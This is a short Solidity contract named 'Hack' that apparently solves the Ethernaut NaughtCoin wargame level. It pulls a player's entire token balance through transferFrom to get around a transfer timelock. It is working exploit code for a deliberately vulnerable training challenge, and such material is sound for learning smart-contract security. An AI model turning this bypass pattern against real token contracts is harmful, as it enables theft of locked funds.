// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function transferFrom(address from, address spender, uint256 amount) external;
    function balanceOf(address owner)external view returns(uint256);
    function player() external view returns (address);
}


contract Hack {
    function hack(address token)public{
        INaughtCoin naughtToken = INaughtCoin(token);
        address player = naughtToken.player();
        uint256 balance = naughtToken.balanceOf(player);
        naughtToken.transferFrom(player, address(this), balance);
    }
}